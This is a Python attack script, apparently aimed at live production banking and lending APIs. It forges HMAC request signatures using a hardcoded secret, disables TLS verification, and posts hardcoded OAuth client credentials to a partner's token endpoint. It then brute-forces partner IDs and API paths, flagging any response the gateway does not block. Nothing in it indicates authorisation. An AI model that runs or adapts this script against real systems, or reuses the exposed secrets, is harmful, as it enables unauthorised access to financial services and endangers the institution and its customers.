#!/usr/bin/env python3
import hmac, hashlib, json, datetime, urllib.request, ssl

SECRET = "XO8V9VcN08JpAw9QXBpYUlQFmxILm4Cb"
ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE

def forge(method, path, body=""):
    now = datetime.datetime.now(datetime.timezone.utc)
    ts = now.strftime('%Y-%m-%dT%H:%M:%S.') + f"{now.microsecond//1000:03d}" + 'Z'
    body_str = "" if body == "" else json.dumps(body)
    h = hashlib.sha256(body_str.encode()).hexdigest()
    msg = f"{method}:{path}:{h}:{ts}"
    sig = hmac.new(SECRET.encode(), msg.encode(), hashlib.sha256).hexdigest()
    return {"X-SIGNATURE": sig, "X-TIMESTAMP": ts, "X-PLATFORM": "WEBVIEW", "X-PARTNER-ID": "payuung"}

def req(method, url, headers):
    r = urllib.request.Request(url, method=method, headers=headers)
    try:
        resp = urllib.request.urlopen(r, timeout=20, context=ctx)
        return resp.status, resp.read()[:400].decode('utf-8', 'ignore')
    except urllib.error.HTTPError as e:
        return e.code, e.read()[:400].decode('utf-8', 'ignore')
    except Exception as e:
        return "ERR", str(e)[:120]

print("== EGRESS IP ==")
try:
    print(urllib.request.urlopen("https://api.ipify.org", timeout=10, context=ctx).read().decode())
except Exception as e:
    print("ipify err", e)

targets = [
    ("https://apigw-prod.bankina.id/exp-api-cicilan/1.0/", "/exp-api-cicilan/1.0/"),
    ("https://apigw-prod.bankina.id/exp-api-cicilan/1.0/cicilan/dashboard", "/exp-api-cicilan/1.0/cicilan/dashboard"),
    ("https://apigw-prod.bankina.id/exp-api-portal-loan/1.0/loan/partner/config", "/exp-api-portal-loan/1.0/loan/partner/config"),
    ("https://apigw-prod.bankina.id/exp-api-portal-loan/1.0/", "/exp-api-portal-loan/1.0/"),
]
for url, path in targets:
    s, b = req("GET", url, {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)", **forge("GET", path)})
    print(f"{s} {path} => {b[:200]}")

print("== PAYUUNG API RETEST (client_credentials) ==")
try:
    data = json.dumps({"client_id":"jgHY8WqE1gZwqEifL9axo9Zo4cik9PDT9DyQy80JdZQ=","client_secret":"ySjvffjjAPkB6EvKv6BTZ7Pwq2sV/R8h/V9HD4MFE4M=","grant_type":"client_credentials"}).encode()
    r = urllib.request.Request("https://api.payuung.com/v2/oauth2/token", data=data, headers={"Content-Type":"application/json"}, method="POST")
    resp = urllib.request.urlopen(r, timeout=20, context=ctx)
    print("payuung token:", resp.status, resp.read()[:150].decode())
except urllib.error.HTTPError as e:
    print("payuung token:", e.code, e.read()[:150].decode())
except Exception as e:
    print("payuung token ERR:", str(e)[:100])


print("== FORGE DENGAN PARTNER ID LAIN + PATH LAIN ==")
partners = ["payuung", "PAYUUNG", "gadjian", "GADJIAN", "fast8", "bina", "1", "2", "10"]
paths = ["/exp-api-cicilan/1.0/", "/exp-api-portal-loan/1.0/", "/exp-api-portal-loan/1.0/loan/limits",
         "/exp-api-auth/1.0/", "/exp-api-bina/1.0/", "/exp-api-onboarding/1.0/", "/exp-api-user/1.0/",
         "/exp-api-loan/1.0/", "/exp-api-master/1.0/", "/1.0/", "/docs", "/swagger.json", "/v1/"]
import time
for partner in partners:
    for path in paths:
        h = forge("GET", path)
        h["X-PARTNER-ID"] = partner
        s, b = req("GET", "https://apigw-prod.bankina.id" + path, {"User-Agent": "Mozilla/5.0", **h})
        marker = "BLOCK" if s == 503 else f"HTTP{s}"
        print(f"{marker} partner={partner} {path} => {b[:80]}")
        if s != 503 and s != 403:
            print(">>> NON-BLOCKED RESPONSE:", s, b[:300])
        time.sleep(0.3)
